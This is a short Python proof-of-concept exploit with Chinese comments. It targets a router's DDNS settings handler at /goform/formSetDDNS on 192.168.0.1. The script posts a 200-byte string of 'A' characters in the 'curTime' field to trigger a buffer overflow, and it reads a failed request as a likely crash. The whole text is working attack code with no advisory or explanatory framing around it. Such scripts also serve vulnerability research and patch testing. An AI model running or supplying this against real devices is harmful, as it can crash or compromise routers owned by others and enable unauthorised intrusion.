import requests

# 目标URL
url = "http://192.168.0.1/goform/formSetDDNS"

# 构造超长payload触发溢出
payload = 'A' * 200  # 超过缓冲区大小的字符串

data = {
    'curTime': payload,  # 触发漏洞的参数
    'settingsChanged': '1',
    'config.dyndns_enabled': 'true',
    'config.dyndns_server': '1',
    'config.dyndns_user': 'testuser',
    'config.dyndns_pass': 'testpass',
    'config.dyndns_host': 'test.example.com'
}

# 发送触发请求
try:
    response = requests.post(url, data=data, timeout=5)
    print(f"Response Status: {response.status_code}")
except requests.exceptions.RequestException as e:
    print(f"Request failed (Possible crash): {e}")